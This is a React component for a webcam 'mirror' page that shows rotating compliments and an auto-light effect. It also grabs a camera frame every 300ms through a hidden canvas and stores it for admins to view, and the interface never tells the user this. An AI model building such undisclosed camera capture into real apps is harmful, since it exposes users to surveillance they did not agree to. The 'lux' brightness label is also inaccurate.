import React, { useState, useEffect, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import './UserPage.css';

function UserPage() {
  const navigate = useNavigate();
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const userId = localStorage.getItem('userId') || 'Unknown User';
  const [isActive, setIsActive] = useState(false);
  const [stream, setStream] = useState(null);
  const [compliment, setCompliment] = useState('Looking amazing! 💖');
  const [isComplimentActive, setIsComplimentActive] = useState(false);
  const [brightness, setBrightness] = useState(0);
  const [lightActive, setLightActive] = useState(false);
  const [lastComplimentType, setLastComplimentType] = useState('general');
  const isManualLightRef = useRef(false);

  const generalCompliments = React.useMemo(() => [
    "look who's beautiful today ❤️",
    "you are so loved 💖",
    "that smile is my favorite thing ✨",
    "your heart is made of gold 💕",
    "shining brighter than ever ❤️",
    "absolutely radiant today 💖",
    "you are a masterpiece ✨",
    "your presence is a gift ❤️",
    "spread love everywhere you go 💕",
    "you deserve all the happiness 💖",
    "be your own kind of beautiful ✨",
    "you are enough, always ❤️",
    "grateful for you 💖",
    "your soul is beautiful 💕",
    "sending you love and light ✨",
    "keep being your amazing self ❤️"
  ], []);

  const specialCompliments = React.useMemo(() => [
    "what a beautiful smile 💕",
    "your eyes light up the room ✨",
    "you glow from within 💖",
    "that's the look of someone special ❤️",
    "beautiful inside and out 💎",
    "your confidence is radiant 🌟",
    "keep that gorgeous smile 😊",
    "you're absolutely stunning 💫",
    "that look suits you perfectly ✨",
    "you're a natural beauty 💕",
    "absolutely glowing today ✨",
    "you light up the world 💖",
    "pure elegance and grace ❤️"
  ], []);

  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [stream]);

  // Broadcast user feed to all admins
  useEffect(() => {
    if (!isActive || !videoRef.current) return;

    const broadcastInterval = setInterval(() => {
      if (canvasRef.current && videoRef.current) {
        const canvas = canvasRef.current;
        const ctx = canvas.getContext('2d');
        const video = videoRef.current;

        canvas.width = video.videoWidth || 400;
        canvas.height = video.videoHeight || 500;

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.7);

        // Store user's feed in localStorage (will be picked up by admin)
        const userFeed = {
          userId,
          timestamp: Date.now(),
          imageData,
          isActive: true
        };

        localStorage.setItem(`feed-${userId}`, JSON.stringify(userFeed));
      }
    }, 300); // Update feed every 300ms

    return () => clearInterval(broadcastInterval);
  }, [isActive, userId]);

  // Analyze brightness for auto light
  useEffect(() => {
    if (!isActive || !videoRef.current) return;

    const brightnessInterval = setInterval(() => {
      const video = videoRef.current;
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 100;
      canvas.height = video.videoHeight || 100;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      let total = 0;

      for (let i = 0; i < data.length; i += 4) {
        const r = data[i];
        const g = data[i + 1];
        const b = data[i + 2];
        const lum = 0.299 * r + 0.587 * g + 0.114 * b;
        total += lum;
      }

      const avg = Math.round(total / (canvas.width * canvas.height));
      setBrightness(avg);

      // Only auto-control light if user hasn't manually toggled it
      if (!isManualLightRef.current) {
        if (avg < 50) {
          setLightActive(true);
        } else {
          setLightActive(false);
        }
      }
    }, 1000);

    return () => clearInterval(brightnessInterval);
  }, [isActive]);

  // Auto-rotate compliments every 2 seconds
  useEffect(() => {
    if (!isActive) return;

    let rotateIndex = 0;
    const rotateInterval = setInterval(() => {
      rotateIndex = (rotateIndex + 1) % generalCompliments.length;
      setCompliment(generalCompliments[rotateIndex]);
    }, 2000);

    return () => clearInterval(rotateInterval);
  }, [isActive, generalCompliments]);

  const startMirror = async () => {
    try {
      // First, request camera permission and get the stream
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }
      });

      // Set isActive FIRST so video element renders
      setIsActive(true);
      setStream(mediaStream);

      // Wait a tick for React to render the video element
      setTimeout(() => {
        if (videoRef.current) {
          videoRef.current.srcObject = mediaStream;
          console.log('✅ Camera stream started successfully');
          
          // Show compliment
          setTimeout(() => {
            showRandomCompliment();
          }, 1000);
        } else {
          console.error('Video element not available after render');
        }
      }, 50);
    } catch (err) {
      console.error('Camera error:', err);
      let errorMsg = 'Camera access denied.';
      if (err.name === 'NotAllowedError') {
        errorMsg = '❌ Camera permission denied. Please allow camera access in your browser settings.';
      } else if (err.name === 'NotFoundError') {
        errorMsg = '❌ No camera found. Please connect a camera device.';
      } else if (err.name === 'NotReadableError') {
        errorMsg = '❌ Camera is in use by another application.';
      }
      alert(errorMsg);
    }
  };

  const stopMirror = () => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      setStream(null);
      setIsActive(false);
    }

    // Mark user as inactive
    const userFeed = {
      userId,
      timestamp: Date.now(),
      imageData: '',
      isActive: false
    };
    localStorage.setItem(`feed-${userId}`, JSON.stringify(userFeed));
  };

  const toggleLight = useCallback(() => {
    setLightActive(prev => !prev);
    isManualLightRef.current = true;
  }, []);

  const showRandomCompliment = () => {
    if (isComplimentActive) return;

    setIsComplimentActive(true);
    
    // Alternate between general and special compliments
    let complimentArray = generalCompliments;
    if (lastComplimentType === 'general') {
      complimentArray = specialCompliments;
      setLastComplimentType('special');
    } else {
      setLastComplimentType('general');
    }
    
    const random = complimentArray[Math.floor(Math.random() * complimentArray.length)];
    setCompliment(random);

    setTimeout(() => {
      setIsComplimentActive(false);
    }, 5000);
  };

  const handleLogout = () => {
    stopMirror();
    localStorage.removeItem('userId');
    localStorage.removeItem(`feed-${userId}`);
    navigate('/');
  };

  return (
    <div className="user-container">
      <div className="user-header">
        <div className="user-info">
          <span className="user-badge">👤 {userId}</span>
          <span className={`status-indicator ${isActive ? 'active' : 'inactive'}`}>
            {isActive ? '🟢 Live' : '⚫ Offline'}
          </span>
        </div>
        <button className="logout-btn" onClick={handleLogout}>Logout</button>
      </div>

      <div className="mirror-container">
        {!isActive ? (
          <div className="landing-screen">
            <div className="mirror-pill">
              <span className="pill-text">Mirror</span>
            </div>
            <p className="tap-hint">tap for a surprise 💕</p>
            <button className="start-btn" onClick={startMirror}>
              Start Mirror
            </button>
          </div>
        ) : (
          <div className={`mirror-frame ${lightActive ? 'light-active' : ''}`}>
            <video
              ref={videoRef}
              className="video-feed"
              autoPlay
              playsInline
              muted
            />

            <div className="compliment-widget active">
              <p>{compliment}</p>
            </div>

            <div className="mirror-controls">
              <button
                className={`control-btn light-btn ${lightActive ? 'active' : ''}`}
                onClick={toggleLight}
              >
                💡
              </button>
              <button
                className="control-btn refresh-btn"
                onClick={showRandomCompliment}
              >
                ✨
              </button>
              <button
                className="control-btn close-btn"
                onClick={stopMirror}
              >
                ✖
              </button>
            </div>

            <div className="brightness-indicator">
              <span>💡 {brightness} lux</span>
            </div>
          </div>
        )}
      </div>

      {/* Hidden canvas for frame capture */}
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
}

export default UserPage;
